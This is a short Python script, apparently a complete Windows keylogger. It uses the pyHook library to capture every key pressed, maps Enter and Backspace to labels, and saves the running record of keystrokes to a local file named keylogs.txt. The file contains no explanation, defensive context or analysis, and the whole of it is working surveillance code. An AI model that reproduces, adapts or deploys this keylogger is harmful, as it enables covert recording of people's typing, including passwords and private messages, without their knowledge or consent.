import pythoncom, pyHook

def keypressed(event):
    global store
    if event.Ascii == 13:
        keys = '< Enter >'
    elif event.Ascii == 8:
        keys = '< Back Space >'
    else:
        keys = chr(event.Ascii)
    store = store + keys
    fp = open("keylogs.txt", "w")
    fp.write(store)
    fp.close()
    return True

store = ''
obj = pyHook.HookManager()
obj.KeyDown = keypressed
obj.HookKeyboard()
pythoncom.PumpMessages()
